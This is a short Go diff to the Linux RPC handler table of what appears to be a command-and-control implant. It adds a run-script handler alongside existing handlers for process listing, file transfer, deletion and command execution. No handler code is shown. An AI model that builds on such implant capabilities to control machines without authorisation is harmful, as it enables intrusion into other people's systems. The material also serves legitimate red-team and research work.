@@ -25,19 +25,20 @@ import ( // {{if .Debug}}
 
 var (
 	linuxHandlers = map[uint32]RPCHandler{
-		pb.MsgPsReq:       psHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgLsReq:       dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
-		pb.MsgTask:        taskHandler,
-		pb.MsgRemoteTask:  remoteTaskHandler,
-		pb.MsgIfconfigReq: ifconfigHandler,
-		pb.MsgExecuteReq:  executeHandler,
+		pb.MsgPsReq:        psHandler,
+		pb.MsgPing:         pingHandler,
+		pb.MsgLsReq:        dirListHandler,
+		pb.MsgDownloadReq:  downloadHandler,
+		pb.MsgUploadReq:    uploadHandler,
+		pb.MsgCdReq:        cdHandler,
+		pb.MsgPwdReq:       pwdHandler,
+		pb.MsgRmReq:        rmHandler,
+		pb.MsgMkdirReq:     mkdirHandler,
+		pb.MsgTask:         taskHandler,
+		pb.MsgRemoteTask:   remoteTaskHandler,
+		pb.MsgIfconfigReq:  ifconfigHandler,
+		pb.MsgExecuteReq:   executeHandler,
+		pb.MsgRunScriptReq: runScriptHandler,
 	}
 )
 
